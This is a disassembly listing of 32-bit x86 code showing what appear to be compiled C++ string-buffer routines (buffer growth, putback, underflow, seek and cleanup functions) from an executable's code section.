  405aa5:	8b e5                	mov    %ebp,%esp
  405aa7:	5d                   	pop    %ebp
  405aa8:	c2 04 00             	ret    $0x4
  405aab:	53                   	push   %ebx
  405aac:	85 c9                	test   %ecx,%ecx
  405aae:	75 04                	jne    0x405ab4
  405ab0:	33 db                	xor    %ebx,%ebx
  405ab2:	eb 10                	jmp    0x405ac4
  405ab4:	8b 46 34             	mov    0x34(%esi),%eax
  405ab7:	8b 18                	mov    (%eax),%ebx
  405ab9:	8b 56 10             	mov    0x10(%esi),%edx
  405abc:	03 db                	add    %ebx,%ebx
  405abe:	2b 1a                	sub    (%edx),%ebx
  405ac0:	03 d9                	add    %ecx,%ebx
  405ac2:	d1 fb                	sar    $1,%ebx
  405ac4:	8b c3                	mov    %ebx,%eax
  405ac6:	d1 e8                	shr    $1,%eax
  405ac8:	83 f8 20             	cmp    $0x20,%eax
  405acb:	73 07                	jae    0x405ad4
  405acd:	b8 20 00 00 00       	mov    $0x20,%eax
  405ad2:	eb 0c                	jmp    0x405ae0
  405ad4:	85 c0                	test   %eax,%eax
  405ad6:	74 1b                	je     0x405af3
  405ad8:	eb 06                	jmp    0x405ae0
  405ada:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  405ae0:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  405ae5:	2b c8                	sub    %eax,%ecx
  405ae7:	3b cb                	cmp    %ebx,%ecx
  405ae9:	73 04                	jae    0x405aef
  405aeb:	d1 e8                	shr    $1,%eax
  405aed:	75 f1                	jne    0x405ae0
  405aef:	85 c0                	test   %eax,%eax
  405af1:	75 0e                	jne    0x405b01
  405af3:	5b                   	pop    %ebx
  405af4:	5f                   	pop    %edi
  405af5:	b8 ff ff 00 00       	mov    $0xffff,%eax
  405afa:	5e                   	pop    %esi
  405afb:	8b e5                	mov    %ebp,%esp
  405afd:	5d                   	pop    %ebp
  405afe:	c2 04 00             	ret    $0x4
  405b01:	03 c3                	add    %ebx,%eax
  405b03:	8b c8                	mov    %eax,%ecx
  405b05:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b08:	e8 73 10 00 00       	call   0x406b80
  405b0d:	8b 56 10             	mov    0x10(%esi),%edx
  405b10:	8b 0a                	mov    (%edx),%ecx
  405b12:	8b f8                	mov    %eax,%edi
  405b14:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405b17:	85 db                	test   %ebx,%ebx
  405b19:	74 15                	je     0x405b30
  405b1b:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  405b1e:	50                   	push   %eax
  405b1f:	51                   	push   %ecx
  405b20:	57                   	push   %edi
  405b21:	e8 0c 30 00 00       	call   0x408b32
  405b26:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405b29:	83 c4 0c             	add    $0xc,%esp
  405b2c:	85 db                	test   %ebx,%ebx
  405b2e:	75 52                	jne    0x405b82
  405b30:	8b 56 14             	mov    0x14(%esi),%edx
  405b33:	89 7e 3c             	mov    %edi,0x3c(%esi)
  405b36:	89 3a                	mov    %edi,(%edx)
  405b38:	8b 46 24             	mov    0x24(%esi),%eax
  405b3b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405b3e:	89 38                	mov    %edi,(%eax)
  405b40:	8d 04 12             	lea    (%edx,%edx,1),%eax
  405b43:	8b 56 34             	mov    0x34(%esi),%edx
  405b46:	d1 f8                	sar    $1,%eax
  405b48:	89 02                	mov    %eax,(%edx)
  405b4a:	f6 46 40 04          	testb  $0x4,0x40(%esi)
  405b4e:	74 1a                	je     0x405b6a
  405b50:	8b 46 10             	mov    0x10(%esi),%eax
  405b53:	89 38                	mov    %edi,(%eax)
  405b55:	8b 56 20             	mov    0x20(%esi),%edx
  405b58:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  405b5e:	8b 46 30             	mov    0x30(%esi),%eax
  405b61:	d1 ff                	sar    $1,%edi
  405b63:	89 38                	mov    %edi,(%eax)
  405b65:	e9 98 00 00 00       	jmp    0x405c02
  405b6a:	8b 56 10             	mov    0x10(%esi),%edx
  405b6d:	89 3a                	mov    %edi,(%edx)
  405b6f:	8b 46 20             	mov    0x20(%esi),%eax
  405b72:	89 38                	mov    %edi,(%eax)
  405b74:	8b 56 30             	mov    0x30(%esi),%edx
  405b77:	c7 02 01 00 00 00    	movl   $0x1,(%edx)
  405b7d:	e9 80 00 00 00       	jmp    0x405c02
  405b82:	8b 46 3c             	mov    0x3c(%esi),%eax
  405b85:	2b c1                	sub    %ecx,%eax
  405b87:	d1 f8                	sar    $1,%eax
  405b89:	8d 14 47             	lea    (%edi,%eax,2),%edx
  405b8c:	8b 46 24             	mov    0x24(%esi),%eax
  405b8f:	89 56 3c             	mov    %edx,0x3c(%esi)
  405b92:	8b 10                	mov    (%eax),%edx
  405b94:	2b d1                	sub    %ecx,%edx
  405b96:	d1 fa                	sar    $1,%edx
  405b98:	8d 04 57             	lea    (%edi,%edx,2),%eax
  405b9b:	8b 56 14             	mov    0x14(%esi),%edx
  405b9e:	8b 1a                	mov    (%edx),%ebx
  405ba0:	2b d9                	sub    %ecx,%ebx
  405ba2:	d1 fb                	sar    $1,%ebx
  405ba4:	8d 1c 5f             	lea    (%edi,%ebx,2),%ebx
  405ba7:	89 1a                	mov    %ebx,(%edx)
  405ba9:	8b 56 24             	mov    0x24(%esi),%edx
  405bac:	89 02                	mov    %eax,(%edx)
  405bae:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405bb1:	03 d2                	add    %edx,%edx
  405bb3:	2b d0                	sub    %eax,%edx
  405bb5:	8b 46 34             	mov    0x34(%esi),%eax
  405bb8:	03 d7                	add    %edi,%edx
  405bba:	d1 fa                	sar    $1,%edx
  405bbc:	89 10                	mov    %edx,(%eax)
  405bbe:	f6 46 40 04          	testb  $0x4,0x40(%esi)
  405bc2:	74 17                	je     0x405bdb
  405bc4:	8b 56 10             	mov    0x10(%esi),%edx
  405bc7:	89 3a                	mov    %edi,(%edx)
  405bc9:	8b 46 20             	mov    0x20(%esi),%eax
  405bcc:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405bd2:	8b 56 30             	mov    0x30(%esi),%edx
  405bd5:	d1 ff                	sar    $1,%edi
  405bd7:	89 3a                	mov    %edi,(%edx)
  405bd9:	eb 27                	jmp    0x405c02
  405bdb:	8b 56 20             	mov    0x20(%esi),%edx
  405bde:	8b 12                	mov    (%edx),%edx
  405be0:	8b 46 24             	mov    0x24(%esi),%eax
  405be3:	8b 00                	mov    (%eax),%eax
  405be5:	8b 5e 10             	mov    0x10(%esi),%ebx
  405be8:	2b d1                	sub    %ecx,%edx
  405bea:	d1 fa                	sar    $1,%edx
  405bec:	8d 14 57             	lea    (%edi,%edx,2),%edx
  405bef:	89 3b                	mov    %edi,(%ebx)
  405bf1:	8b 7e 20             	mov    0x20(%esi),%edi
  405bf4:	2b c2                	sub    %edx,%eax
  405bf6:	89 17                	mov    %edx,(%edi)
  405bf8:	8b 56 30             	mov    0x30(%esi),%edx
  405bfb:	83 c0 02             	add    $0x2,%eax
  405bfe:	d1 f8                	sar    $1,%eax
  405c00:	89 02                	mov    %eax,(%edx)
  405c02:	f6 46 40 01          	testb  $0x1,0x40(%esi)
  405c06:	74 0a                	je     0x405c12
  405c08:	51                   	push   %ecx
  405c09:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  405c0f:	83 c4 04             	add    $0x4,%esp
  405c12:	83 4e 40 01          	orl    $0x1,0x40(%esi)
  405c16:	8b ce                	mov    %esi,%ecx
  405c18:	ff 15 50 a1 40 00    	call   *0x40a150
  405c1e:	66 8b 4d 08          	mov    0x8(%ebp),%cx
  405c22:	5b                   	pop    %ebx
  405c23:	5f                   	pop    %edi
  405c24:	66 89 08             	mov    %cx,(%eax)
  405c27:	66 8b c1             	mov    %cx,%ax
  405c2a:	5e                   	pop    %esi
  405c2b:	8b e5                	mov    %ebp,%esp
  405c2d:	5d                   	pop    %ebp
  405c2e:	c2 04 00             	ret    $0x4
  405c31:	cc                   	int3
  405c32:	cc                   	int3
  405c33:	cc                   	int3
  405c34:	cc                   	int3
  405c35:	cc                   	int3
  405c36:	cc                   	int3
  405c37:	cc                   	int3
  405c38:	cc                   	int3
  405c39:	cc                   	int3
  405c3a:	cc                   	int3
  405c3b:	cc                   	int3
  405c3c:	cc                   	int3
  405c3d:	cc                   	int3
  405c3e:	cc                   	int3
  405c3f:	cc                   	int3
  405c40:	55                   	push   %ebp
  405c41:	8b ec                	mov    %esp,%ebp
  405c43:	8b 41 20             	mov    0x20(%ecx),%eax
  405c46:	8b 00                	mov    (%eax),%eax
  405c48:	85 c0                	test   %eax,%eax
  405c4a:	74 4d                	je     0x405c99
  405c4c:	8b 51 10             	mov    0x10(%ecx),%edx
  405c4f:	3b 02                	cmp    (%edx),%eax
  405c51:	76 46                	jbe    0x405c99
  405c53:	66 8b 55 08          	mov    0x8(%ebp),%dx
  405c57:	56                   	push   %esi
  405c58:	be ff ff 00 00       	mov    $0xffff,%esi
  405c5d:	66 3b f2             	cmp    %dx,%si
  405c60:	5e                   	pop    %esi
  405c61:	74 0c                	je     0x405c6f
  405c63:	66 3b 50 fe          	cmp    -0x2(%eax),%dx
  405c67:	74 06                	je     0x405c6f
  405c69:	f6 41 40 02          	testb  $0x2,0x40(%ecx)
  405c6d:	75 2a                	jne    0x405c99
  405c6f:	8b 41 30             	mov    0x30(%ecx),%eax
  405c72:	ff 00                	incl   (%eax)
  405c74:	8b 41 20             	mov    0x20(%ecx),%eax
  405c77:	83 00 fe             	addl   $0xfffffffe,(%eax)
  405c7a:	b8 ff ff 00 00       	mov    $0xffff,%eax
  405c7f:	66 3b c2             	cmp    %dx,%ax
  405c82:	74 0f                	je     0x405c93
  405c84:	8b 49 20             	mov    0x20(%ecx),%ecx
  405c87:	8b 01                	mov    (%ecx),%eax
  405c89:	66 89 10             	mov    %dx,(%eax)
  405c8c:	0f b7 c2             	movzwl %dx,%eax
  405c8f:	5d                   	pop    %ebp
  405c90:	c2 04 00             	ret    $0x4
  405c93:	33 c0                	xor    %eax,%eax
  405c95:	5d                   	pop    %ebp
  405c96:	c2 04 00             	ret    $0x4
  405c99:	b8 ff ff 00 00       	mov    $0xffff,%eax
  405c9e:	5d                   	pop    %ebp
  405c9f:	c2 04 00             	ret    $0x4
  405ca2:	cc                   	int3
  405ca3:	cc                   	int3
  405ca4:	cc                   	int3
  405ca5:	cc                   	int3
  405ca6:	cc                   	int3
  405ca7:	cc                   	int3
  405ca8:	cc                   	int3
  405ca9:	cc                   	int3
  405caa:	cc                   	int3
  405cab:	cc                   	int3
  405cac:	cc                   	int3
  405cad:	cc                   	int3
  405cae:	cc                   	int3
  405caf:	cc                   	int3
  405cb0:	8b 51 20             	mov    0x20(%ecx),%edx
  405cb3:	56                   	push   %esi
  405cb4:	8b 32                	mov    (%edx),%esi
  405cb6:	85 f6                	test   %esi,%esi
  405cb8:	75 07                	jne    0x405cc1
  405cba:	b8 ff ff 00 00       	mov    $0xffff,%eax
  405cbf:	5e                   	pop    %esi
  405cc0:	c3                   	ret
  405cc1:	53                   	push   %ebx
  405cc2:	57                   	push   %edi
  405cc3:	8b 79 30             	mov    0x30(%ecx),%edi
  405cc6:	8b 1f                	mov    (%edi),%ebx
  405cc8:	8b c6                	mov    %esi,%eax
  405cca:	8d 1c 58             	lea    (%eax,%ebx,2),%ebx
  405ccd:	3b c3                	cmp    %ebx,%eax
  405ccf:	73 07                	jae    0x405cd8
  405cd1:	66 8b 06             	mov    (%esi),%ax
  405cd4:	5f                   	pop    %edi
  405cd5:	5b                   	pop    %ebx
  405cd6:	5e                   	pop    %esi
  405cd7:	c3                   	ret
  405cd8:	f6 41 40 04          	testb  $0x4,0x40(%ecx)
  405cdc:	75 31                	jne    0x405d0f
  405cde:	8b 41 24             	mov    0x24(%ecx),%eax
  405ce1:	8b 00                	mov    (%eax),%eax
  405ce3:	85 c0                	test   %eax,%eax
  405ce5:	74 28                	je     0x405d0f
  405ce7:	3b c6                	cmp    %esi,%eax
  405ce9:	77 05                	ja     0x405cf0
  405ceb:	39 71 3c             	cmp    %esi,0x3c(%ecx)
  405cee:	76 1f                	jbe    0x405d0f
  405cf0:	39 41 3c             	cmp    %eax,0x3c(%ecx)
  405cf3:	73 03                	jae    0x405cf8
  405cf5:	89 41 3c             	mov    %eax,0x3c(%ecx)
  405cf8:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405cfb:	8b 12                	mov    (%edx),%edx
  405cfd:	2b c2                	sub    %edx,%eax
  405cff:	d1 f8                	sar    $1,%eax
  405d01:	89 07                	mov    %eax,(%edi)
  405d03:	8b 49 20             	mov    0x20(%ecx),%ecx
  405d06:	8b 01                	mov    (%ecx),%eax
  405d08:	66 8b 00             	mov    (%eax),%ax
  405d0b:	5f                   	pop    %edi
  405d0c:	5b                   	pop    %ebx
  405d0d:	5e                   	pop    %esi
  405d0e:	c3                   	ret
  405d0f:	5f                   	pop    %edi
  405d10:	5b                   	pop    %ebx
  405d11:	b8 ff ff 00 00       	mov    $0xffff,%eax
  405d16:	5e                   	pop    %esi
  405d17:	c3                   	ret
  405d18:	cc                   	int3
  405d19:	cc                   	int3
  405d1a:	cc                   	int3
  405d1b:	cc                   	int3
  405d1c:	cc                   	int3
  405d1d:	cc                   	int3
  405d1e:	cc                   	int3
  405d1f:	cc                   	int3
  405d20:	55                   	push   %ebp
  405d21:	8b ec                	mov    %esp,%ebp
  405d23:	51                   	push   %ecx
  405d24:	8b 51 24             	mov    0x24(%ecx),%edx
  405d27:	8b 02                	mov    (%edx),%eax
  405d29:	85 c0                	test   %eax,%eax
  405d2b:	74 08                	je     0x405d35
  405d2d:	39 41 3c             	cmp    %eax,0x3c(%ecx)
  405d30:	73 03                	jae    0x405d35
  405d32:	89 41 3c             	mov    %eax,0x3c(%ecx)
  405d35:	53                   	push   %ebx
  405d36:	8a 5d 18             	mov    0x18(%ebp),%bl
  405d39:	56                   	push   %esi
  405d3a:	57                   	push   %edi
  405d3b:	f6 c3 01             	test   $0x1,%bl
  405d3e:	0f 84 dc 00 00 00    	je     0x405e20
  405d44:	8b 41 20             	mov    0x20(%ecx),%eax
  405d47:	8b 00                	mov    (%eax),%eax
  405d49:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d4c:	85 c0                	test   %eax,%eax
  405d4e:	0f 84 cc 00 00 00    	je     0x405e20
  405d54:	8b 55 14             	mov    0x14(%ebp),%edx
  405d57:	83 fa 02             	cmp    $0x2,%edx
  405d5a:	75 17                	jne    0x405d73
  405d5c:	8b 51 10             	mov    0x10(%ecx),%edx
  405d5f:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405d62:	2b 02                	sub    (%edx),%eax
  405d64:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405d67:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405d6a:	d1 f8                	sar    $1,%eax
  405d6c:	99                   	cltd
  405d6d:	03 f8                	add    %eax,%edi
  405d6f:	13 da                	adc    %edx,%ebx
  405d71:	eb 34                	jmp    0x405da7
  405d73:	83 fa 01             	cmp    $0x1,%edx
  405d76:	75 19                	jne    0x405d91
  405d78:	f6 c3 02             	test   $0x2,%bl
  405d7b:	75 18                	jne    0x405d95
  405d7d:	8b 51 10             	mov    0x10(%ecx),%edx
  405d80:	2b 02                	sub    (%edx),%eax
  405d82:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405d85:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405d88:	d1 f8                	sar    $1,%eax
  405d8a:	99                   	cltd
  405d8b:	03 f8                	add    %eax,%edi
  405d8d:	13 da                	adc    %edx,%ebx
  405d8f:	eb 16                	jmp    0x405da7
  405d91:	85 d2                	test   %edx,%edx
  405d93:	74 0c                	je     0x405da1
  405d95:	a1 b4 a0 40 00       	mov    0x40a0b4,%eax
  405d9a:	8b 38                	mov    (%eax),%edi
  405d9c:	8b 58 04             	mov    0x4(%eax),%ebx
  405d9f:	eb 06                	jmp    0x405da7
  405da1:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405da4:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405da7:	85 db                	test   %ebx,%ebx
  405da9:	0f 8c 18 01 00 00    	jl     0x405ec7
  405daf:	7f 08                	jg     0x405db9
  405db1:	85 ff                	test   %edi,%edi
  405db3:	0f 82 0e 01 00 00    	jb     0x405ec7
  405db9:	8b 41 10             	mov    0x10(%ecx),%eax
  405dbc:	8b 30                	mov    (%eax),%esi
  405dbe:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405dc1:	2b c6                	sub    %esi,%eax
  405dc3:	d1 f8                	sar    $1,%eax
  405dc5:	99                   	cltd
  405dc6:	3b da                	cmp    %edx,%ebx
  405dc8:	0f 8f f9 00 00 00    	jg     0x405ec7
  405dce:	7c 08                	jl     0x405dd8
  405dd0:	3b f8                	cmp    %eax,%edi
  405dd2:	0f 87 ef 00 00 00    	ja     0x405ec7
  405dd8:	2b 75 fc             	sub    -0x4(%ebp),%esi
  405ddb:	8b 41 30             	mov    0x30(%ecx),%eax
  405dde:	d1 fe                	sar    $1,%esi
  405de0:	03 f7                	add    %edi,%esi
  405de2:	29 30                	sub    %esi,(%eax)
  405de4:	8b 41 20             	mov    0x20(%ecx),%eax
  405de7:	8d 14 36             	lea    (%esi,%esi,1),%edx
  405dea:	01 10                	add    %edx,(%eax)
  405dec:	f6 45 18 02          	testb  $0x2,0x18(%ebp)
  405df0:	0f 84 db 00 00 00    	je     0x405ed1
  405df6:	8b 71 24             	mov    0x24(%ecx),%esi
  405df9:	8b 06                	mov    (%esi),%eax
  405dfb:	85 c0                	test   %eax,%eax
  405dfd:	0f 84 ce 00 00 00    	je     0x405ed1
  405e03:	8b 51 34             	mov    0x34(%ecx),%edx
  405e06:	8b 12                	mov    (%edx),%edx
  405e08:	8d 04 50             	lea    (%eax,%edx,2),%eax
  405e0b:	8b 51 20             	mov    0x20(%ecx),%edx
  405e0e:	8b 12                	mov    (%edx),%edx
  405e10:	89 16                	mov    %edx,(%esi)
  405e12:	8b 49 34             	mov    0x34(%ecx),%ecx
  405e15:	2b c2                	sub    %edx,%eax
  405e17:	d1 f8                	sar    $1,%eax
  405e19:	89 01                	mov    %eax,(%ecx)
  405e1b:	e9 b1 00 00 00       	jmp    0x405ed1
  405e20:	f6 c3 02             	test   $0x2,%bl
  405e23:	0f 84 92 00 00 00    	je     0x405ebb
  405e29:	8b 02                	mov    (%edx),%eax
  405e2b:	89 45 18             	mov    %eax,0x18(%ebp)
  405e2e:	85 c0                	test   %eax,%eax
  405e30:	0f 84 85 00 00 00    	je     0x405ebb
  405e36:	8b 55 14             	mov    0x14(%ebp),%edx
  405e39:	83 fa 02             	cmp    $0x2,%edx
  405e3c:	75 17                	jne    0x405e55
  405e3e:	8b 51 10             	mov    0x10(%ecx),%edx
  405e41:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405e44:	2b 02                	sub    (%edx),%eax
  405e46:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405e49:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405e4c:	d1 f8                	sar    $1,%eax
  405e4e:	99                   	cltd
  405e4f:	03 f8                	add    %eax,%edi
  405e51:	13 da                	adc    %edx,%ebx
  405e53:	eb 2f                	jmp    0x405e84
  405e55:	83 fa 01             	cmp    $0x1,%edx
  405e58:	75 14                	jne    0x405e6e
  405e5a:	8b 51 10             	mov    0x10(%ecx),%edx
  405e5d:	2b 02                	sub    (%edx),%eax
  405e5f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405e62:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405e65:	d1 f8                	sar    $1,%eax
  405e67:	99                   	cltd
  405e68:	03 f8                	add    %eax,%edi
  405e6a:	13 da                	adc    %edx,%ebx
  405e6c:	eb 16                	jmp    0x405e84
  405e6e:	85 d2                	test   %edx,%edx
  405e70:	74 0c                	je     0x405e7e
  405e72:	a1 b4 a0 40 00       	mov    0x40a0b4,%eax
  405e77:	8b 38                	mov    (%eax),%edi
  405e79:	8b 58 04             	mov    0x4(%eax),%ebx
  405e7c:	eb 06                	jmp    0x405e84
  405e7e:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405e81:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405e84:	85 db                	test   %ebx,%ebx
  405e86:	7c 3f                	jl     0x405ec7
  405e88:	7f 04                	jg     0x405e8e
  405e8a:	85 ff                	test   %edi,%edi
  405e8c:	72 39                	jb     0x405ec7
  405e8e:	8b 41 10             	mov    0x10(%ecx),%eax
  405e91:	8b 30                	mov    (%eax),%esi
  405e93:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405e96:	2b c6                	sub    %esi,%eax
  405e98:	d1 f8                	sar    $1,%eax
  405e9a:	99                   	cltd
  405e9b:	3b da                	cmp    %edx,%ebx
  405e9d:	7f 28                	jg     0x405ec7
  405e9f:	7c 04                	jl     0x405ea5
  405ea1:	3b f8                	cmp    %eax,%edi
  405ea3:	77 22                	ja     0x405ec7
  405ea5:	2b 75 18             	sub    0x18(%ebp),%esi
  405ea8:	8b 41 34             	mov    0x34(%ecx),%eax
  405eab:	d1 fe                	sar    $1,%esi
  405ead:	03 f7                	add    %edi,%esi
  405eaf:	29 30                	sub    %esi,(%eax)
  405eb1:	8b 49 24             	mov    0x24(%ecx),%ecx
  405eb4:	8d 14 36             	lea    (%esi,%esi,1),%edx
  405eb7:	01 11                	add    %edx,(%ecx)
  405eb9:	eb 16                	jmp    0x405ed1
  405ebb:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405ebe:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405ec1:	8b c7                	mov    %edi,%eax
  405ec3:	0b c3                	or     %ebx,%eax
  405ec5:	74 0a                	je     0x405ed1
  405ec7:	a1 b4 a0 40 00       	mov    0x40a0b4,%eax
  405ecc:	8b 38                	mov    (%eax),%edi
  405ece:	8b 58 04             	mov    0x4(%eax),%ebx
  405ed1:	8b 45 08             	mov    0x8(%ebp),%eax
  405ed4:	89 38                	mov    %edi,(%eax)
  405ed6:	5f                   	pop    %edi
  405ed7:	33 c9                	xor    %ecx,%ecx
  405ed9:	5e                   	pop    %esi
  405eda:	89 58 04             	mov    %ebx,0x4(%eax)
  405edd:	89 48 08             	mov    %ecx,0x8(%eax)
  405ee0:	89 48 0c             	mov    %ecx,0xc(%eax)
  405ee3:	89 48 10             	mov    %ecx,0x10(%eax)
  405ee6:	5b                   	pop    %ebx
  405ee7:	8b e5                	mov    %ebp,%esp
  405ee9:	5d                   	pop    %ebp
  405eea:	c2 14 00             	ret    $0x14
  405eed:	cc                   	int3
  405eee:	cc                   	int3
  405eef:	cc                   	int3
  405ef0:	55                   	push   %ebp
  405ef1:	8b ec                	mov    %esp,%ebp
  405ef3:	83 e4 f8             	and    $0xfffffff8,%esp
  405ef6:	8b 45 14             	mov    0x14(%ebp),%eax
  405ef9:	83 ec 0c             	sub    $0xc,%esp
  405efc:	53                   	push   %ebx
  405efd:	99                   	cltd
  405efe:	56                   	push   %esi
  405eff:	57                   	push   %edi
  405f00:	8b f8                	mov    %eax,%edi
  405f02:	03 7d 0c             	add    0xc(%ebp),%edi
  405f05:	8b 41 24             	mov    0x24(%ecx),%eax
  405f08:	8b 00                	mov    (%eax),%eax
  405f0a:	8b da                	mov    %edx,%ebx
  405f0c:	13 5d 10             	adc    0x10(%ebp),%ebx
  405f0f:	85 c0                	test   %eax,%eax
  405f11:	74 08                	je     0x405f1b
  405f13:	39 41 3c             	cmp    %eax,0x3c(%ecx)
  405f16:	73 03                	jae    0x405f1b
  405f18:	89 41 3c             	mov    %eax,0x3c(%ecx)
  405f1b:	a1 b4 a0 40 00       	mov    0x40a0b4,%eax
  405f20:	8b 30                	mov    (%eax),%esi
  405f22:	8b 40 04             	mov    0x4(%eax),%eax
  405f25:	89 74 24 10          	mov    %esi,0x10(%esp)
  405f29:	89 44 24 14          	mov    %eax,0x14(%esp)
  405f2d:	3b fe                	cmp    %esi,%edi
  405f2f:	75 08                	jne    0x405f39
  405f31:	3b d8                	cmp    %eax,%ebx
  405f33:	0f 84 d9 00 00 00    	je     0x406012
  405f39:	f6 45 24 01          	testb  $0x1,0x24(%ebp)
  405f3d:	74 7c                	je     0x405fbb
  405f3f:	8b 51 20             	mov    0x20(%ecx),%edx
  405f42:	8b 12                	mov    (%edx),%edx
  405f44:	89 54 24 0c          	mov    %edx,0xc(%esp)
  405f48:	85 d2                	test   %edx,%edx
  405f4a:	74 6f                	je     0x405fbb
  405f4c:	85 db                	test   %ebx,%ebx
  405f4e:	0f 8c ba 00 00 00    	jl     0x40600e
  405f54:	7f 08                	jg     0x405f5e
  405f56:	85 ff                	test   %edi,%edi
  405f58:	0f 82 b0 00 00 00    	jb     0x40600e
  405f5e:	8b 41 10             	mov    0x10(%ecx),%eax
  405f61:	8b 30                	mov    (%eax),%esi
  405f63:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405f66:	2b c6                	sub    %esi,%eax
  405f68:	d1 f8                	sar    $1,%eax
  405f6a:	99                   	cltd
  405f6b:	3b da                	cmp    %edx,%ebx
  405f6d:	0f 8f 93 00 00 00    	jg     0x406006
  405f73:	7c 08                	jl     0x405f7d
  405f75:	3b f8                	cmp    %eax,%edi
  405f77:	0f 87 89 00 00 00    	ja     0x406006
  405f7d:	2b 74 24 0c          	sub    0xc(%esp),%esi
  405f81:	8b 41 30             	mov    0x30(%ecx),%eax
  405f84:	d1 fe                	sar    $1,%esi
  405f86:	03 f7                	add    %edi,%esi
  405f88:	29 30                	sub    %esi,(%eax)
  405f8a:	8b 41 20             	mov    0x20(%ecx),%eax
  405f8d:	8d 14 36             	lea    (%esi,%esi,1),%edx
  405f90:	01 10                	add    %edx,(%eax)
  405f92:	f6 45 24 02          	testb  $0x2,0x24(%ebp)
  405f96:	74 7a                	je     0x406012
  405f98:	8b 71 24             	mov    0x24(%ecx),%esi
  405f9b:	8b 06                	mov    (%esi),%eax
  405f9d:	85 c0                	test   %eax,%eax
  405f9f:	74 71                	je     0x406012
  405fa1:	8b 51 34             	mov    0x34(%ecx),%edx
  405fa4:	8b 12                	mov    (%edx),%edx
  405fa6:	8d 04 50             	lea    (%eax,%edx,2),%eax
  405fa9:	8b 51 20             	mov    0x20(%ecx),%edx
  405fac:	8b 12                	mov    (%edx),%edx
  405fae:	89 16                	mov    %edx,(%esi)
  405fb0:	8b 49 34             	mov    0x34(%ecx),%ecx
  405fb3:	2b c2                	sub    %edx,%eax
  405fb5:	d1 f8                	sar    $1,%eax
  405fb7:	89 01                	mov    %eax,(%ecx)
  405fb9:	eb 57                	jmp    0x406012
  405fbb:	f6 45 24 02          	testb  $0x2,0x24(%ebp)
  405fbf:	74 4d                	je     0x40600e
  405fc1:	8b 51 24             	mov    0x24(%ecx),%edx
  405fc4:	8b 12                	mov    (%edx),%edx
  405fc6:	89 54 24 0c          	mov    %edx,0xc(%esp)
  405fca:	85 d2                	test   %edx,%edx
  405fcc:	74 40                	je     0x40600e
  405fce:	85 db                	test   %ebx,%ebx
  405fd0:	7c 3c                	jl     0x40600e
  405fd2:	7f 04                	jg     0x405fd8
  405fd4:	85 ff                	test   %edi,%edi
  405fd6:	72 36                	jb     0x40600e
  405fd8:	8b 51 10             	mov    0x10(%ecx),%edx
  405fdb:	8b 32                	mov    (%edx),%esi
  405fdd:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405fe0:	2b c6                	sub    %esi,%eax
  405fe2:	d1 f8                	sar    $1,%eax
  405fe4:	99                   	cltd
  405fe5:	3b da                	cmp    %edx,%ebx
  405fe7:	7f 1d                	jg     0x406006
  405fe9:	7c 04                	jl     0x405fef
  405feb:	3b f8                	cmp    %eax,%edi
  405fed:	77 17                	ja     0x406006
  405fef:	2b 74 24 0c          	sub    0xc(%esp),%esi
  405ff3:	8b 41 34             	mov    0x34(%ecx),%eax
  405ff6:	d1 fe                	sar    $1,%esi
  405ff8:	03 f7                	add    %edi,%esi
  405ffa:	29 30                	sub    %esi,(%eax)
  405ffc:	8b 49 24             	mov    0x24(%ecx),%ecx
  405fff:	8d 04 36             	lea    (%esi,%esi,1),%eax
  406002:	01 01                	add    %eax,(%ecx)
  406004:	eb 0c                	jmp    0x406012
  406006:	8b 44 24 14          	mov    0x14(%esp),%eax
  40600a:	8b 74 24 10          	mov    0x10(%esp),%esi
  40600e:	8b fe                	mov    %esi,%edi
  406010:	8b d8                	mov    %eax,%ebx
  406012:	8b 45 08             	mov    0x8(%ebp),%eax
  406015:	89 38                	mov    %edi,(%eax)
  406017:	5f                   	pop    %edi
  406018:	33 c9                	xor    %ecx,%ecx
  40601a:	5e                   	pop    %esi
  40601b:	89 58 04             	mov    %ebx,0x4(%eax)
  40601e:	89 48 08             	mov    %ecx,0x8(%eax)
  406021:	89 48 0c             	mov    %ecx,0xc(%eax)
  406024:	89 48 10             	mov    %ecx,0x10(%eax)
  406027:	5b                   	pop    %ebx
  406028:	8b e5                	mov    %ebp,%esp
  40602a:	5d                   	pop    %ebp
  40602b:	c2 20 00             	ret    $0x20
  40602e:	cc                   	int3
  40602f:	cc                   	int3
  406030:	8b 06                	mov    (%esi),%eax
  406032:	85 c0                	test   %eax,%eax
  406034:	74 0a                	je     0x406040
  406036:	50                   	push   %eax
  406037:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40603d:	83 c4 04             	add    $0x4,%esp
  406040:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  406046:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  40604d:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  406054:	c3                   	ret
  406055:	cc                   	int3
  406056:	cc                   	int3
  406057:	cc                   	int3
